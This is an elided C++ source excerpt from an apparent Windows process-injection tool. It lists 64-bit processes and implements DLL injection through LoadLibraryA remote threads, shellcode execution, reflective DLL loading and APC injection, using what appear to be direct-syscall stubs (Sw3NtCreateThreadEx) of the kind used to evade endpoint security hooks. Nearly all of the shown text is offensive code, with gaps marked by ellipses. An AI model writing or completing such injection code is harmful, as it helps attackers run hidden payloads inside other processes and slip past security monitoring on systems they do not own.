    ...
    namespace Injector
    {
        ...
        std::vector<ProcessInfo> listInjectable()
        {
            ...
            for (;
                processInfo;)
            {
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)(ULONG_PTR)processInfo->ProcessId);
                ...
                if (IsWow64Process(hProcess, &bWow64))
                {
                    ...
                    if (!bWow64)
                        procInfo.push_back(
                            ProcessInfo{ (DWORD)(ULONG_PTR)processInfo->ProcessId, processInfo->ImageName.Buffer });
        ...
        bool remoteThreadInject(DWORD pid, int mode, std::string args)
        {
            ...
            if (mode == 0) // inject dll file
            {
                ...
                LPVOID LoadLibraryBase = (LPVOID)GetProcAddress(hmodDLL, "LoadLibraryA");
...
#ifdef _WIN64
                NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (PVOID)(LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, FALSE, NULL, NULL, NULL, NULL);
            ...
            else if (mode == 1 || mode == 2) // 启动shellcode
            {
                HANDLE hRemoteProcess = NULL;
#ifdef _WIN64
                NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (PVOID)(LPTHREAD_START_ROUTINE)pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
                if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS)
                {
                    Error::error(L"Create Remote Thread Failed!");
                    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        ...
        bool reflectInject(DWORD pid, int mode, std::string args)
        {
            ...
            if (mode == 0 || mode == 1)
            {
                ...
                HANDLE hThread = NULL;
#ifdef _WIN64
                NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (PVOID)(LPTHREAD_START_ROUTINE)lpReflectiveLoader, pAddress, FALSE, NULL, NULL, NULL, NULL);
        ...
        bool apcInject(DWORD pid, int mode, std::string args)
        {
            ...
            for (; processInfo;)
            {
                if ((DWORD)(ULONG_PTR)processInfo->ProcessId == pid)
                {
                    // loop thread
                    for (ULONG i = 0; i < processInfo->NumberOfThreads; i++)
                    {
                        hThread = OpenThread(
                            PROCESS_ALL_ACCESS,
                            FALSE,
                            (DWORD)(ULONG_PTR)processInfo->Threads[i].ClientId.UniqueThread);
                        if (hThread == INVALID_HANDLE_VALUE || hThread == NULL)
                        {
                            continue;
                        }
